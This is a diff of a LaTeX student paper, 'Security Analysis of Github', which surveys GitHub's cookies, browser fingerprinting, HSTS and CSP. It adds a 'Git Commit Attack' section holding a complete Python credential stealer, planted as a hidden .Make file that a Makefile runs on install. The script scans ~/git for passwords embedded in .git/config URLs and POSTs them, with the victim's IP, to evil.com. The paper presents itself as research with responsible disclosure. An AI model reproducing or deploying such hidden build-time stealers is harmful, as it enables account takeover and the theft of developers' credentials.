@@ -2,6 +2,7 @@
 \title{Security Analysis of Github}
 \author{
         Sean Smith, Kyle Holzinger, Amalia Safer\\
+        swsmith, kholz, asafer @bu.edu
 }
 \date{\today}
 
@@ -13,8 +14,11 @@
 \usepackage{amsmath}
 \usepackage{listings}
 \usepackage{subfigure}
+%\usepackage{minted}
+\RequirePackage[font=small,font=sf,labelfont=bf]{caption}[]
 
 
+\usepackage{listings}
 \usepackage{algpseudocode}
 \usepackage{alltt}
 \usepackage{textcomp}
@@ -37,12 +41,56 @@
                {\def\@captype {table}}
                {}
 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\DeclareFixedFont{\ttm}{T1}{txtt}{m}{n}{12}  % for normal
+
+% Custom colors
+\usepackage{color}
+\definecolor{deepblue}{rgb}{0,0,0.5}
+\definecolor{deepred}{rgb}{0.6,0,0}
+\definecolor{deepgreen}{rgb}{0,0.5,0}
+
+\usepackage{listings}
+
+% Python style for highlighting
+\newcommand\pythonstyle{\lstset{
+language=Python,
+basicstyle=\ttm,
+otherkeywords={self},             % Add keywords here
+keywordstyle=\ttb\color{deepblue},
+emph={MyClass,__init__},          % Custom highlighting
+emphstyle=\ttb\color{deepred},    % Custom highlighting style
+stringstyle=\color{deepgreen},
+frame=tb,                         % Any extra options here
+showstringspaces=false            % 
+}}
+
+
+% Python environment
+\lstnewenvironment{python}[1][]
+{
+\pythonstyle
+\lstset{#1}
+}
+{}
+
+% Python for external files
+\newcommand\pythonexternal[2][]{{
+\pythonstyle
+\lstinputlisting[#1]{#2}}}
+
+% Python for inline
+\newcommand\pythoninline[1]{{\pythonstyle\lstinline!#1!}}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
 
 \begin{document}
 \maketitle
 
+%Introduction
 \section{Introduction}
-INSERT INTRODUCTION HERE
+Github is a website that makes it easy to collaborate on code. In the past it has been targeted by foreign governments over hosting software that allows citizens to avoid censorship. It has over 8 million users and hosts code that would be of interest to many governments. There is credible evidence that the Chinese government launched a ddos attack github.com using a tool called the great cannon. This indicates that Github is of great interest to many entities. \url{https://citizenlab.org/2015/04/chinas-great-cannon/}
 
 \section{Cookies}\label{cookies}
 	A session cookie called {\tt user\_session} is stored which contains a seemingly random nonce. When a get request is made to {\tt https://github.com}, the cookie is sent and the database is queried to see if the cookie is valid. If the cookie is valid it will return user data as if the user is logged in. There are two more cookies of importance {\tt logged\_in} which is a yes/no value and {\tt dotcom\_user} which is the user's username. To impersonate a user, only the {\tt user\_session} is needed, the {\tt logged\_in} cookie will always be yes and the {\tt dotcom\_user} will be filled by the server if the {\tt user\_session} cookie is valid. When the user logs out, the cookie is invalided by the server in a post request to {\tt https://github.com/logout} that contains the content type and an authenticity token. The authenticity token is a random nonce that github uses to prevent against CSRF. If an attacker is using the user's cookie and the user logs out, the attacker's cookie will be invalidated.
@@ -67,7 +115,7 @@ Github does not serve ads as it's business model revolves around selling premium
 
 \begin{figure}
 \begin{table}
-\begin{tabular}{| l | p{7cm} | p{7cm} |}
+\begin{tabular}{| l | p{4cm} | p{4cm} |}
 \hline
 \textbf{Browser Characteristic} & \textbf{Bits of identifying information} & \textbf{One in x browsers have this} \\ \hline
 User Agent & 12.92  & 7752.4 \\ \hline
@@ -79,24 +127,34 @@ System Fonts                    & 17.21                                    & 151
 Are Cookies Enabled?            & 0.43                                     & 1.35                                 \\ \hline
 supercookie test                & 0.86                                     & 1.81                                 \\ \hline
 \end{tabular}
-\end{table}
-\caption{\newline}
+\caption{Browser Fingerprint\newline}
 \label{fig:mig_over}
+\end{table}
 \end{figure}
 
 
 \end{enumerate}
 
-%Section CSP
-\section{CSP}
-Content security policy or CSP is a way of whitelisting domains that github.com is allowing to load into into the page. This whitelist contains the.\\
+
+
+%SECTION SSL
+\section{SSL Everywhere}
+
+All connections to github.com are done via https. This is enforced via HTTP strict transport security (HSTS). Github sets the {\tt Strict-Transport-Security} header to {\tt max-age=31536000; includeSubdomains; preload}. This ensures that for the next year, the browser will only accept connections from github.com over SSL. To further this Github is now included in the chrome STS file. This is a file that ships with Chrome and ensures that whenever Chrome goes to \url{github.com} it will only accept connections over SSL. Since Chrome is open source we dug up the STS (strict transport security) file and found the entry that corresponds to Chrome.
+
+{\tt \{ "name": "github.com", "include\_subdomains": true, "mode": "force-https" \}}
+
+The browser is very strict against SSL, once the HSTS header is sent it does not request non-https pages. The command line client for GIT is much less secure. If a request is made like:\\ \tt{git clone http://github.com/sean-smith/example.git}\\ It first makes a request to \tt{github.com} over HTTP. The page then sends back a response with status code \tt{301 Moved Permanently} that redirects the browser to the https version. This leaks information such as the computer that the user is using, using the fingerprinting header method described earlier, the resource that the user is trying to access and potentially the username and the password of the user as described by an attack that we explain later.
+
+
+All of the subdomains that correspond to github send all of their traffic over ssl. Github has an alternate domain \url{github.io} that sends all traffic over http. Github.io solely hosts user created web pages. Github can neither vouch for or protect the authenticity of pages hosted in github.io and therefore does not provide authen  \\
 
 \begin{figure}
 \begin{table}
 \begin{tabular}{| l | l | l | l | l | }
 \hline
 
-Subdomain & Visitors & Percent of Daily Traffic \\ \hline
+\textbf{Subdomain} & \textbf{Visitors} & \textbf{Percent of Daily Traffic} \\ \hline
 github.com & 12,910,000 & 85.34\% \\ \hline
 gist.github.com & 1,237,000 & 8.18\%  \\ \hline
 help.github.com & 330,600 & 2.19\%  \\ \hline
@@ -104,60 +162,116 @@ codeload.github.com & 206,500 & 1.37\%  \\ \hline
 twitter.github.com & 106,600 & 0.7\%  \\ \hline
 status.github.com & 89,100 & 0.59\%  \\ \hline
 windows.github.com & 87,700 & 0.58\%  \\ \hline
-divshot.github.com & 59,400 & 0.39\%  \\ \hline
 guides.github.com & 56,700 & 0.37\%  \\ \hline
-fortawesome.github.com & 44,500 & 0.29\%  \\ \hline
 \end{tabular}
-\end{table}
-\caption{\newline}
+\end{table}\\
+\centering
+\caption{Subdomains\newline}
 \label{fig:mig_over}
 \end{figure}
 
 
-\section{SSL Everywhere}
-
-All connections to github.com are done via https. This is enforced via HTTP strict transport security (HSTS). Github sets the {\tt Strict-Transport-Security} header to {\tt max-age=31536000; includeSubdomains; preload}. This ensures that for the next year, the browser will only accept connections from github.com over SSL. To further this Github is now included in the chrome STS file. This is a file that ships with Chrome and ensures that whenever Chrome goes to \url{github.com} it will only accept connections over SSL. Since Chrome is open source we dug up the STS (strict transport security) file and found the entry that corresponds to Chrome.
-
-{\tt \{ "name": "github.com", "include\_subdomains": true, "mode": "force-https" \}}
-
+%%%%%%%%%%%%%%%%\newpage
 
 \section{Git Commit Attack}
 Github relies on the security of Git which has much more security flaws than SSL. We demonstrate an attack the takes advantage of git (github) passwords stored in the clear.
 
 \begin{figure}
 \centering
-\includegraphics[scale=.5]{attack.png}
+\includegraphics[scale=.5]{attack2.png}
 \caption{Diagram of our attack\newline}
 \label{fig:mig_over}
 \end{figure}
 
 \begin{enumerate}
-\item First the user clones the repository using the command\\ {\tt git clone https://kholzinger:<password>@github.com/kylelh/linkeffects}
-\item Then the user runs the Makefile, a standard procedure on any operating system.\\
+\item First the user clones the repository using the command\\ {\tt git clone https://kholzinger:$<$password$>$@github.com/kylelh/linkeffects}
+\item Then the user runs the Makefile, a standard procedure during installation.\\
 {\tt make}
 
-\item The {\tt Makefile} parses the git username and password which are stored in {\tt .git/config} file. The git username and password are also the {\tt github.com} username and password.
+\item The {\tt Makefile} parses the git username and password which are stored in {\tt .git/config} file. The git username and password are also the {\tt github.com} username and password. It also searches the entire home directory in the background for any config files with plaintext usernames and passwords.
 \item We send the username, password, and ip address to the command and control server. We can then log into the users account.
-
 
 \end{enumerate}
 
-\section{XSS}
+You can see our compromised git repository here \url{https://github.com/kyleLH/linkeffects}, complete with a \tt{README.md} that instructs the victim on how to 'install' the repository. For purposes of responsible disclosure it's private so send us an email to get access. We made a hidden file .Make python file and called it in the Makefile. The code in the hidden \tt{.Make} file is included below. First it searches for a \tt{config} file in the home directory with a plaintext username and password. Then it sends a post request with the username, password, and ip back to our server. 
 
-Github has two major protections against cross-site-scripting (XSS) attacks. The first is the standard Ruby on Rails library to encode html tags as their number equivalent. So the \tt{$<$div$>$} tag is encoded as \tt{&lt;div&gt;} but still renders the name. The second defense against XSS is wrapping results from the html 
+
+
+\begin{python}
+#!/usr/bin/env python 
+
+import urllib, urllib2, sys, socket, re, os
+
+ip = socket.gethostbyname(socket.gethostname())
+
+
+files = [os.path.join(dp, f) for dp, dn, \
+fn in os.walk(os.path.expanduser("~/git")) for f in fn]
+
+for cur in files:
+    p1 = re.compile('\.git\/config$')
+    p2 = re.compile('\/\/(.+):(.+)@github.com')
+    m = p1.findall(cur)
+    if not(m == []):
+        f = open(cur, 'r')
+        l = []
+        for lines in f:
+                l.append(lines)
+
+        mess = ''.join(l).replace('\n', '')
+        m2 = re.match(r".+\/\/(.+):(.+)@github.com.+", mess)
+        if m2:
+            results = (m2.group(1), m2.group(2))
+            '''
+            Here, you can use whatever
+            URL you want. I used evil.com, 
+            and there is sample code 
+            in index.js which can be used to
+            accept incoming post requests.
+            '''
+            url = 'http://evil.com'
+            values = {'username' : results[0],
+                      'password' : results[1],
+                      'ip' : ip }
+
+            try:
+                data = urllib.urlencode(values)
+                req = urllib2.Request(url, data)
+                response = urllib2.urlopen(req)
+                the_page = response.read()
+            except:
+                pass
+\end{python}
+
+
+%XSS Section
+\section{XSS Defenses}
+
+Github has two major protections against cross-site-scripting (XSS) attacks. The first is two escape all user input. They use the standard Ruby on Rails library to encode html tags as their number equivalent. So the \tt{$<$div$>$} tag is encoded as \tt{\&lt;div\&gt;} but still renders the name. They also wrap all user input in quotes. The type of the quote changes depending on if the user enters a single quote or double. If the user enters a single quote then it will wrap it in double quotes and if the user enters a double quote then it will wrap it in single quotes.
 
 \begin{lstlisting}
 <%=h "<p> will be preserved" %>
 \end{lstlisting}
 
+The second defense is to add a \tt{Content security policy} header. CSP is a way of whitelisting domains that github.com is allowing to load into into the page. This gives us a unique insight into what resources github uses in it's pages. I included some of the interesting sources that github uses below. A csp header prevents the page from running scripts that are not from the source. The \url{*.wp.com} means that means that github allows wordpress subdomains. Wordpress used to issue \url{username.wp.com} domains to users. This is a security risk as a user could host a malicious script on his old \url{username.wp.com} then find some way to insert it into the page and it would be valid under the CSP header.
 
+\begin{lstlisting}
+www.google-analytics.com
+*.wp.com;
+www.youtube.com 
+player.vimeo.com 
+checkout.paypal.com;  
+www.google-analytics.com 
+github-cloud.s3.amazonaws.com
+\end{lstlisting}
 
-
+%Section References
 \section{References}\label{references}
 \begin{enumerate}
 \item We used this this online tool to fingerprint the browser much in the same way that Google Analytics does.\\ \url{https://panopticlick.eff.org/index.php?action=log&js=yes}
 
 \item There was an attack that's still possible listed here: \url{http://www.devfactor.net/2014/12/30/2375-amazon-mistake/}
+\item Evidence the chinese targeted github.com in a ddos attack \url{https://citizenlab.org/2015/04/chinas-great-cannon/}
 \end{enumerate}
 \end{document}
 This is never printed
